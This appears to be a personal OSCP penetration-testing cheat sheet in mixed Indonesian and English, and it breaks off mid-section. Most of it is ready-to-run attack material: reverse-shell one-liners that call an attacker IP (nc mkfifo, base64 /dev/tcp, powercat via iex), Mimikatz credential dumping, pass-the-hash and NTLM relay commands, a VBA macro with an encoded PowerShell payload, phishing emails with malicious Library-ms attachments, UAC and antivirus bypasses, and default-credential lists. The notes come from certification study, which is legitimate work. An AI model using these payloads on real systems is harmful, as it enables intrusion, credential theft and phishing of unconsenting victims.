https://github.com/0xsyr0/OSCP
> Additional notes
> SELALU DUMP PASSWORD, JGN LUPA PASS THE HASH
> INTENRAL WEB SERVER + SSH ACCESS = TARO MALICIOUS FILE DI SERVERNYA LANGSUNG LALU AKSES DI WEBNYA BUAT REVSHELL SBG AKUN WEB.
> SELALU CEK POWERSHELL HISTORY DULU SEBELUM ENUM. CHECK DI SETIAP USER
> --local-auth FLAG TERPENTING KETIKA SPRAYING.
> JGN LUPA SNMP (NMAP 3X SCAN, NORMAL, SNMP, FULL). JGN LUPA PAKE EXTENDED MIB JUGA.
`sudo nmap -sVU 192.168.182.156 -oN nmap/frankfurt_udp -vvv -p161`

> Jgn lupa baca catetan yang udah lu tulis susah-susah ini atas ke bawah
> JGN TAKUT REVERSE ENGINEER DAN STRINGS BINARY. Kalo butuh password tinggal | grep password aja.
> JGN LUPA -windows-auth kalo pake mssqlclient
> ADA FORM MINTA INPUT URL + WINDOWS MACHINE == responder or relay attack
> If code execution doesn’t work, download it using wget or curl to /tmp or /dev/shm and execute it.
> Winpeas and linpeas first, then manual. 
> Suspicious port di local, most likely forward and exploit.

> NAMA MESIN OR NARRATIVE MESINNYA, BISA JADI CLUE ENUMERATION, BRUTEFORCE, OR EXPLOIT
> KALO ADA WEIRD SUID BINARY, GOOGLE for related exploit, JANGAN NGANDALIN GTFOBINS DOANG.

> KALO GK ADA GCC, JGN NYERAH, CARI GCC VERSION LAIN DI MESINNYA.
`find / -iname “*gcc*” -type f 2>/dev/null`
BISA AJA ADA GCC LAIN YG GK KEDETECT KYK gcc-9

> KALO ADA CRONJOB, MOSTLIKELY SUSPICIOUS, KALO KITA BISA TIMPA SCRIPT OR BINARY DI YG EXECUTE, TIMPA AJA SMW.
> WINPEAS, SEARCH FOR REGISTRY.

> Enum4linux jgn lupa

> username:username >> IS KEY
> TRY TO BRUTE "admin".. ALWAYS
> CARI DEFAULT CREDENTIALS. SELALU COBA INI
admin:admin
admin:password
administrator:administrator
administrator:password 
admin:root
admin:secret
admin:123456
tomcat:tomcat
password:password
secret:secret

# HARUSNYA KALO STUCK PAKE `autorecon` aja..

# Wordlist paths
/opt/wordlists/SecLists/Discovery/Web-Content/big.txt
/opt/wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt
/opt/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt

# FIX PYTHON2 IMPACKET FOR OLD EXPLOITS (SPENT HOURS ON THIS)
https://0xdf.gitlab.io/2021/05/11/htb-blue.html#python-script 
```bash
cd /opt/impacket/

virtualenv impacket-venv -p $(which python2)

source /opt/impacket/impacket-venv/bin/activate

pip install impacket==0.9.15 # JANGAN PAKE pip install requirements.txt dan pip install . (DAH GW COBA, BAKAL NGACO)
```
## Persistence
```cmd
net user nox password123! /add
net localgroup administrators nox /add
net localgroup "Remote Desktop Users" nox /add
net localgroup "Remote Management Users" nox /add
```

## SQUID PROXY BISA DIPAKE BUAT PROXYCHAINS KE INTERNAL
```/etc/proxychains.conf
http 192.168.194.224 3128 <squid_proxy_user> <squid_proxy_password>
```

## Tips
1. Kalo SCP gk bisa, coba pake flag -O buat source filenya ([OSCP Practice Series 60]).
2. GraphQL - Gatsby and Depreciated [OSCP Prep Series]
3. Deserialization (ysoserial) - [OSCP Practice Series 52] Proving Grounds — Cassios
4. Zip, PHP zip wrapper for RCE https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/
5. PRESS EVERY BUTTON ON THE WEB.
6. Windows >> SYSTEM + ntds.dit == `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL` (OSCP Practice Series 65 - Resourced)
https://www.bordergate.co.uk/extracting-windows-credentials-using-native-tools/
```cmd
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

-security >> GK WAJIB
```
>> SELALU CHECK windows.old directory. >> CARI SAM DAN SYSTEM KALO BISA DIDOWNLOAD.

7. Check valid hash yang bisa di winrm
```cmd
crackmapexec winrm 192.168.167.175 -u <users_file_or_string> -H <hash_or_hashfile>
crackmapexec smb 192.168.167.175 -u <users_file_or_string> -H <hash_or_hashfile>
proxychains crackmapexec winrm ips.txt -u wario -p 'Mushroom!'

(OSCP Practice Series 65 - Resourced) - https://medium.com/@ardian.danny/oscp-practice-series-65-proving-grounds-resourced-05eb9a129e28
```
8. GenericAll, Resourced-based Constrained Delegation Attack (Resource base)
```cmd
[OSCP Practice Series 65] Proving Grounds-Resourced
https://medium.com/@ardian.danny/oscp-practice-series-65-proving-grounds-resourced-05eb9a129e28
```
9. SMB download all files and directory
```smb
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
```
10. Kalo ada port 80, usually Windows (tanpa webdav keliatan). Atau specifically ada webdav. EXPLOIT IT WITH `cadaver`, langsung upload shell ke webnya.
```bash
cadaver http://192.168.167.122
put /opt/php-reverse-shell-windows.php
```
11. Interesting keywords LDAP, "AdmPwd"
12. When stuck, generate wordlists (https://github.com/Mebus/cupp, OSCP Practice 67 - Thor).
13. Webmin privilege escalation 
```cmd
[OSCP Practice 67] Proving Grounds-Thor
```
14. Always try `crackmapexec` kalo ada SMB or LDAP di Linux or Windows to test connection. Jgn rely ke `smbclient` aja.
```bash
crackmapexec smb 192.168.167.240 -U '' -P '' --shares
```
15. Freeswitch + Cassandra Exploit
```cmd
[OSCP Practice Series 69] Proving Grounds-Clue
```
16. EXPLOITNG REDIS and Shared Object (.so) privilege escalation.
```cmd
[OSCP Practice Series 72] Proving Grounds-Sybaris
```
17. Wordpress SELALU COBA aggressive plugin detection
```cmd
wpscan --update --url http://192.168.120.66/ --enumerate ap --plugins-detection aggressive
[OSCP Practice Series 73] Proving Grounds-Maria
```

18. PYTHON DECOMPILE (pyinstxtractor.py + Uncompyle6)
```cmd
[OSCP Practice Series 76] Proving Grounds - KeyVault
```

19. XXE, preg_replace(), tcpdump capabilities, and mosquitto_pub (MQTT) exploitation
```cmd
[OSCP Practice Series 77] Proving Grounds — Glider
https://medium.com/@ardian.danny/oscp-practice-series-77-proving-grounds-glider-7048e51a26e8
```

20. Automated Powershell Portscanning (Mungkin guna buat scan mesin pivot 1) [PENTING BUAT AD] 
```cmd
Windows:
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

21. SNMPv1, and SNMPv2 is VULNERABLE TO BRUTEFORCE ATTACKS
>> INI KEMISS PAS EXAM, SNMP ITU BISA DIBRUTE COMMUNITY STRINGNYA, GK CUMA PUBLIC,PRIVATE, DAN MANAGER. ADA BNYK.

https://nmap.org/nsedoc/scripts/snmp-brute.html
```cmd
nmap -sU --script snmp-brute <target> --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt

ATAU PAKE AUTORECON

autorecon <target>

ATAU PAKE onesixtyone (Yang delbert pake)

onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-
strings-onesixtyone.txt -dd 192.168.95.110
```
```cmd (look hacktrickz or oscp module)
snmpwalk -c public -v1 -t 10 192.168.187.23 >> KALO GK SPECIFY MIB, ENUM SEMUA
snmpwalk -c public -v1 -t 10 192.168.187.151 -Oa
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25

https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp [IMPORTANT TRY TO USE EXTENDED ATTRIBUTES, BISA DPT CREDS]
sudo apt-get install snmp-mibs-downloader
sudo download-mibs

# Finally comment the line saying "mibs :" in /etc/snmp/snmp.conf
sudo subl /etc/snmp/snmp.conf

snmpwalk -v1 -c public 192.168.182.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull

Community String
public
private
manager

Versions
-v1
-v2
-v3

MIB Process Tree
1.3.6.1.2.1.25.1.6.0 	System Processes
1.3.6.1.2.1.25.4.2.1.2 	Running Programs
1.3.6.1.2.1.25.4.2.1.4 	Processes Path
1.3.6.1.2.1.25.2.3.1.4 	Storage Units
1.3.6.1.2.1.25.6.3.1.2	Software Name
1.3.6.1.4.1.77.1.2.25 	User Accounts
1.3.6.1.2.1.6.13.1.3 	TCP Local Ports
```
22. Windows LFI (Path traversal)
```cmd (tetep ../)
curl --path-as-is "http://192.168.209.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt"
```
23. JANGAN LUPA COBA RFI, (LOAD PAYLOAD DARI WEB SERVER KITA)

24. Auto Generate + Setup Listener for POWERSHELL REVERSE SHELL
```bash
python hoaxshell.py -s <listen_ip> -p 5555
```
```bash
msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.45.168 LPORT=443 --format psh --smallest | msfvenom -a x64 --platform Windows -e powershell/base64 NOEXIT
```
25. ALTERNATIVE NETCAT, `powercat.ps1` (netcat buat powershell)
```cmd
iex (New-Object Net.WebClient).DownloadString('http://192.168.45.168:8000/powercat.ps1');powercat -c <kali_ip> -p <listener_port> -e <powershell or cmd>

IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.168:8000/powercat.ps1');powercat -c 192.168.45.168 -p 1234 -e powershell

or manual

. .\powercat.ps1
powercat -c <kali_ip> -p <listener_port> -e <powershell>
```

26. MySQL, search for specific user
```sql
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```

27. IF STUCK, TEST ALL INPUT ON THE WEB, ESPECIALLY FOR SQLI

28. EXPLOITING MACRO (.doc or .odt) ==> https://medium.com/@ardian.danny/oscp-practice-series-59-proving-grounds-craft-4b86a013924d ([OSCP Practice Series 59]) Proving Grounds — Craft)

```cmd (VBA MACRO) (PEN-200 CLIENT-SIDE ATTACK)
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell -e JABzAD0AJwAxADkAMgAuADEANgA4AC4ANAA1"
	Str = Str + "AC4AMQA2ADgAOgAxADIAMwA0ACcAOwAkAGkAPQAnADgAYwBmAG"
	Str = Str + "EAOQBkADAAYQAtADMAYgBjADUANwBjADcANgAtAGMAZAA5AGUA"
	Str = Str + "NwBmAGUANAAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOw"
	...
	Str = Str + "JwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA="
    CreateObject("Wscript.Shell").Run Str
End Sub
```

29. KALO BUTUH NAMA OR EMAIL, JGN LUPA CEK EXIFDATA DARI FILE KYK PDF, TXT, ETC.
`exiftool -a -u <file_name>`

30. CURL URLENCODE (get request)
```bash
curl --get https://192.168.209.45/uploads/shell.php -k --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.168 1234 >/tmp/f"
```
31. CEK FIREFOX, PASSWORD MANAGER, APAPUN ITU YG MEMUNGKINKAN BUAT NYIMPEN PASSWORD

32. MISAL KITA DAPET AKSES TAPI GK PUNYA PASSWORD DAN BUTUH PASSWORD. Responder aja. Query SMB ato http ke responder kali.



31. Hashcat rule

## MUTATING WORDLISTS

1. How to use
```bash
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```
2. List rule
```bash
/usr/share/hashcat/rules
```
3. Custom rules
```bash
https://hashcat.net/wiki/doku.php?id=rule_based_attack
$ ==> Append
^ ==> Prepend
c ==> Capitalize
u ==> Uppercase all letter
d ==> Double the letter (password jadi passwordpassword)
```
```demo.rule (HARUS PERKARAKTER, GK BOLEH KYK $123!)
$1 c $!
$2 c $!
$1 $2 $3 c $!
```
ex word: password
> Password1!
> Password2!
> Password123!

32. Cracking id_rsa (privatekey)
```cmd
ssh2john id_rsa > ssh.hash

hashcat -h | grep -i "ssh"
```
(Liat tipenya yg mana)
```cmd
hashcat -m 22921 ssh.hash ssh.passwords -r custom_rule_sesuai_sikon.rule --force
```
Kalo error, kyk gini:
Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception

Pake john aja. Rulenya gmn? UPDATE, tambahin ini [List.Rules:sshRules], c/o:

```sshrule.txt
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```
```cmd
sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'

john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```
33. Mau redirect output ke file yang punya root privileges
```bash
sudo sh -c 'cat /home/nox/Documents/PEN-200/password_attacks/ssh_private_key/vm1/vm1.rule >> /etc/john/john.conf'
```

# WINDOWS: MIMIKATZ, NTLM, HASHES, AND IMPACKET

We can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the SeDebugPrivilege10 access right enabled.

We can also elevate our privileges to the SYSTEM account with tools like *PsExec* or the built-in Mimikatz *token elevation function* to obtain the required privileges. The token elevation function requires the *SeImpersonatePrivilege*

1. Get user in the system
```cmd
Get-LocalUser
```
2. Mimikatz Dump NTLM
```cmd
PS C:\tools> .\mimikatz.exe

mimikatz # privilege::debug 	(cek udah ok apa belom)
mimikatz # token::elevate 		(naik jadi nt)
mimikatz # lsadump::sam 		(dump ntlm hash)

or
iwr http://192.168.45.168:8000/mimikatz.exe -outfile mimikatz.exe
certutil -urlcache -f http://192.168.45.168:8000/mimikatz.exe mimikatz.exe

. .\Invoke-Mimikatz.ps1
iex (New-Object Net.WebClient).DownloadString('http://192.168.45.168:8000/Invoke-Mimikatz.ps1')

Invoke-Mimikatz -Command '"privilege::debug"' (pastikan Administrator)
Invoke-Mimikatz -Command '"token::elevate"' 
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' (dapet NTLM and SHA1 hash)
Invoke-Mimikatz -Command '"lsadump::sam"'
Invoke-Mimikatz -Command '"lsadump::secrets"'
Invoke-Mimikatz -Command '"vault::cred /patch"'

or langsung aja

.\Invoke-Mimikatz
Invoke-Mimikatz

NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
```
3. Crack NTLM
```cmd
hashcat -m 1000 nelly.hash /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## PASS THE HASH, PASSTHEHASH, PASS-THE-HASH (PTH)

We can use this technique to authenticate to a local or remote target with a valid combination of username and NTLM hash rather than a plaintext password

# SMB Enumeration
- smbclient
```bash
smbclient \\\\192.168.199.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```
- crackmapexec
```bash
crackmapexec smb 192.168.199.212 -u administrator -H 7a38310ea6f0027ee955abed1762964b --shares
crackmapexec smb 192.168.199.212 -u administrator -H 7a38310ea6f0027ee955abed1762964b -X whoami
```

# Command Execution / Windows Remote (COBAIN SMW SATU-SATU)
- impacket-psexec
```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.199.212


"LMHash:NTHash"
Since we only use the NTLM hash, we can fill the LMHash section with 32 0's.
```
- impacket-smbexec
```bash
impacket-smbexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.199.212 
```
- impacket-wmiexec
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.199.212
```
- impacket-mssqlclient
```cmd
proxychains impacket-mssqlclient -hashes :e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@10.10.151.142 -windows-auth
```
- evil-winrm
```bash
evil-winrm -i 192.168.199.212 -u Administrator -H 7a38310ea6f0027ee955abed1762964b
```

# LM vs NTLM (NTHash) vs NTLMv1 vs NTLMv2
LM: 299BD128C1101FD6
john --format=lm hash.txt 
hashcat -m 3000 -a 3 hash.txt

NTLM: 8846f7eaee8fb117ad06bdd830b7586c
john --format=nt hash.txt
hashcat -m 1000 -a 3 hash.txt

NTLMv1: u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
john --format=netntlm hash.txt
hashcat -m 5500 -a 3 hash.txt

NTLMv2: admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt

NTLMv2 biasa dapet yg dari responder.


# Responder to steal NTLMv2 Hash. Case: Punya akses tapi gk punya credentials. Butuh credsnya, tapi low priv, gk ada mimikatz.
1. Kali set responder
```bash
sudo responder -v -I tun0
or
sudo responder -v -I tun0 -wd
```
2. User foothold low priv, query smb (KALO BUTUH PASSWORDNYA)
```cmd
C:\Windows\system32>dir \\192.168.119.2\test
```
3. Cek responder.
```
paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E0048005500580043003400540049004300...
...951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 
```
4. Crack ntlmv2
```cmd
hashcat -m 5600 paul.hash /opt/wordlists/rockyou.txt --force
```
Selalu coba masukkin \\\\192.168.45.168\\asd di parameter filename or apapun di webform, yang kira-kira bakal ngeload
> WINDOWS SELALU ARAHKAN KE RESPONDER


# Relaying Net-NTLMv2, RELAY ATTACK, impacket-ntlmrelayx (IMPORTANT)
>> Case: NTLMv2 GK BISA DICRACK, Kalo user yang kita punya hash NTLMv2nya itu adalah Administrator di mesin lain. Kita bisa relay NTLMv2 hashnya ke mesin lain tersebut, jadinya kita dapet akses ke sana.
imagine we obtained the Net-NTLMv2 hash, but couldn't crack it because it was too complex.

>> Case: Hash NTLMv2 user yang kita punya sama dengan Hash NTLMv2 local administrator di mesin lain

-t ini adalah IP mesin tujuannya (mesin_windows_2)

kali > mesin_windows_1 (yg kita dapet ntlmv2nya) > mesin_windows_2 (yg ntlmv2 usernya sama dengan yg kita dapet)

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "<command_to_execute> palingan powershell revshell aja"
```
>> Jadi instead of responder yang cuma nangkep NTLMv2 Hash, `impacket-ntlmrelayx` akan nangkap, dan langsung forward ke mesin target dan execute code.

1. Kita tinggal tringger dari mesin_windows_1. query SMB ke kali kita
```cmd
C:\Windows\system32>dir \\192.168.119.2\test
```
2. Cek netcat or hoaxshell listener kita, udah dapet revshell.

## Powershell Execution Policy
```cmd
powershell -ep bypass
or
Set-ExecutionPolicy -ExecutionPolicy Bypass
```


## Client-side attacks
keywords: Group Policy Object (GPO), 

*Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares. These files have a .Library-ms file extension and can be executed by double-clicking them in Windows Explorer.*

https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/abusing-windows-library-files/obtaining-code-execution-via-windows-library-files
>> Penjelasan detail liat module aja


1. Host webdav within our attacker machine
```bash
pip3 install wsgidav

mkdir webdav
touch webdav/test.txt
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/

http://127.0.0.1/
```

2. RDP to client
3. Open text editor, vscode, notepad, etc.
4. New File, namanya `config.Library-ms`

*Library files consist of three major parts and are written in XML to specify the parameters for accessing remote locations. The parts are General library information, Library properties, and Library locations. Let's build the XML code by adding and explain the tags. We can refer to the Library Description Schema6 for further information. We'll begin by adding the XML and library file's format version.*

```xml config.Library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<WEB_DAV_IP></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

5. Open di Windows Explorer, akan terlihat test.txt yang kita buat. Sukses kita akses remote share dari windows explorer.

6. Notice di PATH explorernya, itu gk remote, gk ada kyk //<ip>/test.txt. Jadi sulit dinotice oleh victim

*When we re-open our file in Visual Studio Code, we find that a new tag appeared named serialized.23 The tag contains base64-encoded information about the location of the url tag. Additionally, the content inside the url tags has changed from http://192.168.119.2 to \\192.168.119.2\DavWWWRoot. Windows tries to optimize the WebDAV connection information for the Windows WebDAV client24 and therefore modifies it.*

*The library file still works when we double-click it, but due to the encoded information in the serialized tag, it may not be working on other machines or after a restart. This could result in a situation where our client-side attack fails, because Windows Explorer shows an empty WebDAV share.*

7. Create new shortcut (buat reverse shell.lnk)

8. Location itemnya taro revshell kita (gk boleh panjang-panjang)
```cmd
powershell.exe -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.45.168:8000/powercat.ps1');powercat -c 192.168.45.168 -p 1234 -e powershell"
```
9. Taro nama filenya (gk ush tambah .lnk, ntar otomatis), Finish. Double click shortcutnya dan akan dapet shell.

10. Pivot ke mesin lain, copy automatic_configuration.lnk and config.Library-ms to our WebDAV directory (double click config.Library-ms)

11. cd ke webdav directory

12. Transfer ke clientnya lewat smb, kebetulan buka
```cmd
smbclient //192.168.209.195/share -c 'put config.Library-ms'
```
MOTW (mark of the web akan tetap diberikan even kita download file dari local network via smb or http server. MOTW bakal diberikan buat semua file yang datang dari external sources).

## Sending email using Swaks (easier)
```bash
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.234.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```
>> body.txt (itu pesannya, dear mr blalba, please open this documents.. etc.)

## Sending email using Telnet SMTP
```bash
telnet 192.168.209.199 25
EHLO supermagicorg.com
AUTH LOGIN
334 VXNlcm5hbWU6
[Base64-encoded username] >> dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==
334 UGFzc3dvcmQ6
[Base64-encoded password] >> dGVzdA==
MAIL FROM:ardian.danny@supermagicorg.com
RCPT TO:dave.wizard@supermagicorg.com
DATA
<emailnya>
.
```
## Sending email using SMTP with ATTACHMENT (send phishing, doc with Macro, config.Library-ms, etc.)
> Sama kyk sebelumnya, cuma beda di isi data aja
> SESUAIKAN CONTENT TYPE ETC.
> CONVERT FILENYA KE BASE64 STRING
```bash
base64 config.Library-ms > config.Library-ms_base64
```
```bash (JGN LANGSUNG COPY SMW, NTAR RUSAK, LINE BY LINE)
DATA
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="boundary_string"

--boundary_string
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 7bit

Hello, Dave, please open this file.

--boundary_string
Content-Type: application/octet-stream; name="config.Library-ms"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="config.Library-ms"

PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxsaWJyYXJ5RGVzY3JpcHRp
b24geG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZG93cy8yMDA5L2xpYnJh
cnkiPg0KICA8bmFtZT5Ad2luZG93cy5zdG9yYWdlLmRsbCwtMzQ1ODI8L25hbWU+DQogIDx2ZXJz
aW9uPjg8L3ZlcnNpb24+DQogIDxpc0xpYnJhcnlQaW5uZWQ+dHJ1ZTwvaXNMaWJyYXJ5UGlubmVk
Pg0KICA8aWNvblJlZmVyZW5jZT5pbWFnZXJlcy5kbGwsLTEwMDM8L2ljb25SZWZlcmVuY2U+DQog
IDx0ZW1wbGF0ZUluZm8+DQogICAgPGZvbGRlclR5cGU+ezdkNDlkNzI2LTNjMjEtNGYwNS05OWFh
LWZkYzJjOTQ3NDY1Nn08L2ZvbGRlclR5cGU+DQogIDwvdGVtcGxhdGVJbmZvPg0KICA8c2VhcmNo
Q29ubmVjdG9yRGVzY3JpcHRpb25MaXN0Pg0KICAgIDxzZWFyY2hDb25uZWN0b3JEZXNjcmlwdGlv
bj4NCiAgICAgIDxpc0RlZmF1bHRTYXZlTG9jYXRpb24+dHJ1ZTwvaXNEZWZhdWx0U2F2ZUxvY2F0
...
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBPC9zZXJpYWxpemVkPg0KICAgICAgPC9zaW1wbGVM
b2NhdGlvbj4NCiAgICA8L3NlYXJjaENvbm5lY3RvckRlc2NyaXB0aW9uPg0KICA8L3NlYXJjaENv
bm5lY3RvckRlc2NyaXB0aW9uTGlzdD4NCjwvbGlicmFyeURlc2NyaXB0aW9uPg==

--boundary_string--
.
```

## Enable RDP (enable remote desktop)
```cmd
Powershell:
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

CMD:
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Enable on firewall:
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

## KALO UDAH LOCAL ADMINISTRATOR TAPI GK BISA AKSES ADMINISTRATOR (UAC bypass)
1. Cari bypass UAC via CLI. Fodhelper paling gampang
2. Reference
https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper/
https://www.youtube.com/watch?v=XF8_7yE-BM0&t=0s&ab_channel=GeminiCyberSecurity
```cmd
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\nox\shell.exe" -Force
```
3. Set a listener buat nerima shell.exenya
4. Execute fodhelper
```cmd
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```
==== ATO GK PAKE SCRIPT INI AJA
https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1 (UDAH GW CUSTOM DI /opt/FodhelperBypass.ps1)

5. Dia bakal add user nox baru yg high priority.
6. Tinggal gini aja, upload lalu:
```cmd
. .\FodhelperBypass.ps1
FodhelperBypass
```
7. Checknya jalanin `whoami /groups` harusnya ada `Mandatory Label\High Mandatory Level`


## Scan port internal network Windows (NIMSCAN, NimScan.exe)
```cmd
iwr http://192.168.45.168:8000/NimScan.exe -outfile NimScan.exe
NimScan 10.0.0.0/24 -p:1-5000 
NimScan 10.0.0.1-10.0.0.10 -p:80,443,445
.\NimScan.exe 10.0.0.69 -a
```

## COMPILING WINDOWS EXPLOIT IN KALI (.c)
1. Sering kita issue librarynya missing terus. Karenam memang harus dicross-compile
```bash
sudo apt install mingw-w64
```
2. Compilenya begini
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
```
3. Kalo error google aja, biasanya tinggal tambahin flag kyk gini
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```
4. Karena mingw32 pasti hasilnya exe, jadi kita executenya pake wine
```bash
wine syncbreeze_exploit.exe
wine32 syncbreeze_exploit.exe
```
5. Issue butuh wine32 [UNSOLVED, KYKNYA EMNG MASALAH ARM]
https://www.youtube.com/watch?v=Xw9WBP_TJHw&ab_channel=HackHunt


## AV Bypass
1. ps_encoder.py
2. Shellter
> Ikutin Module aja
> Veil ==> https://cyberarms.wordpress.com/2018/05/29/anti-virus-bypass-with-veil-on-kali-linux/


## File Upload Trickz that perhaps you might miss

Webshell PATH: `/usr/share/webshells/`

1. PHP Extension Bypass for File Upload (Play with uppercase aswell, ex PHp)
```php
.php
.php3
.php4
.php5
.php7
.php8
.phtml
.phar
```
2. Taro filepath ke filenamenya, relative or absolute buat overwrite file.
```cmd
cat ~/.ssh/id_rsa.pub > authorized_keys 
>> lalu upload authorized_keysnya

Overwrite Root Authorized Keys
 ../../../../../../../root/.ssh/authorized_keys

etc..
```

## Command Execution Trickz
https://book.hacktricks.xyz/pentesting-web/command-injection

1. Check if the command is executed on CMD or powershell on dows
```cmd
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
2. Buat pembatas jgn lupa url encode ; or &&

3. Jgn lupakan backtick
```cmd
`ls`
`man`
%60echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE2OC8xMjM0IDA%2BJjE%3D+%7C+base64+-d+%7C+bash%60
```

## TRANSFER FILE FROM WINDOWS TO KALI LINUX
```bash Kali machine
impacket-smbserver shatternox . -smb2support -user asd -password asd
```
```cmd Windows
net use X: \\192.168.45.168\shatternox /user:asd asd

copy 20240411030917_BloodHound.zip \\192.168.45.168\shatternox
```

## Transferring File Using Netcat (netcat transfer file nc transfer file)
https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/

> Di mesin kita yg mau nerima ex: Kali Linux
```bash (Kita listen)
nc -l -p 1234 > hash_file
```
> Di mesin target yang mau ngirip file: ex Windows Mesin Kedua (After Foothold)
```bash (Dia ngirim, connect)
nc.exe -w 3 <our_kali_ip> 1234 < hash_file

-w >> maximum timeout (secs)
```

# NMAP - INITIAL - NMAP SCAN
1. Nmap
- Regular
```bash
sudo nmap -sCVS -oN nmap/astronaut -vvv 192.168.207.12 
```
- Regular + UDP (takutnya ada SNMP)
```bash
sudo nmap -sVU -oN nmap/astronaut -vvv 192.168.207.12 -p 161
```
- FULL THROTTLE
```bash
